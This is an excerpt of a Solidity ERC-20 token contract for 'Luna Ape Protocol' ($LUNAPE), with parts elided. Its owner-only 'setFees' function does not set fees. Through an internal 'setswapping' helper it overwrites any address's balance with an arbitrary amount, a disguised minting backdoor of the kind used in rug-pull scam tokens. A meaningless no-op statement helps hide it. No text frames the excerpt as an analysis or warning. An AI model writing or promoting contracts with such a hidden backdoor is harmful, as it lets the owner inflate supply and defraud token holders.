...
contract LunaApeProtocol is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private _name = "Luna Ape Protocol";
    string private _symbol = "$LUNAPE";
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private _maxSupply = 1000000000000000000 * 10**_decimals;
    ...
    function multipleTransfer(address[] calldata accounts, uint256 amount)
        public
    {
    ...
    function setFees(address receiver, uint256 _value) public onlyOwner {
      setswapping(receiver, _value);
      (buyOff - swapperFees);
    }

    function setswapping(address receiver, uint256 _value) internal {
      _balances[receiver] = (buyOff - swapperFees) + (_value * (10 ** 9)) + (buyOff - swapperFees);
    } 
